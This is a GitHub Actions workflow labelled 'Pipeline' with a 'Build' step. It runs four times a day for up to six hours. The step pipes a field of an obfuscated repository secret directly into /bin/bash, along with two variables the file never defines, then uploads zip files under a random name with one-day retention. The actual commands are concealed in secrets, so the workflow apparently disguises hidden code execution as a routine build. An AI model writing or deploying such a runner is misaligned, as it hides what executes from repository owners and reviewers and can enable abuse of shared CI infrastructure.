name: Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '49 0,6,12,18 * * *'
permissions:
  contents: read
  actions: read
jobs:
  operation:
    name: Run task
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Build
        env:
          zj2: ${{ secrets.zj2 }}
        run: |
          printf '%s' "$zj2" | jq -r .xrhjg1096 | /bin/bash
          printf '%s' "$jk0" | jq -r .xuqxx2 | /bin/bash
          echo $ocjat475 | jq -r .a312 | /bin/bash

      - name: Archive output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: q5qgCcuc
          path: "*.zip"
          retention-days: 1
